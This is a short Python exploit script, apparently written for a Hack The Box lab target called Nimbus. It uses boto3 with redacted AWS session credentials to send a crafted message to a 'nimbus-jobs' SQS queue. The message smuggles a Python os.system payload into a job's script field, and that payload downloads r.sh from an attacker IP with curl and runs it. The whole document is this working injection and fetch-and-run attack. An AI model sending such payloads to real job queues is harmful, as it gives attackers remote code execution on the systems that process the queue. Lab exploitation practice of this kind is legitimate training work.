import boto3

ACCESS_KEY = "<REDACTED>"
SECRET_KEY = "<REDACTED>"
SESSION_TOKEN = ("<REDACTED_SESSION_TOKEN>")

ENDPOINT = "http://aws.nimbus.htb"
QUEUE_URL = f"{ENDPOINT}/<REDACTED_ACCOUNT_ID>/nimbus-jobs"

session = boto3.session.Session(
    aws_access_key_id=ACCESS_KEY,
    aws_secret_access_key=SECRET_KEY,
    aws_session_token=SESSION_TOKEN,
    region_name="us-east-1",
)
sqs = session.client("sqs", endpoint_url=ENDPOINT)

bootstrap = '__import__("os").system("curl 10.10.14.180:8003/r.sh -o /tmp/rfinal.sh; sh /tmp/rfinal.sh")'
message_body = "name: pwn\nscript: '" + bootstrap + "'\n"

resp = sqs.send_message(QueueUrl=QUEUE_URL, MessageBody=message_body)
print(resp)
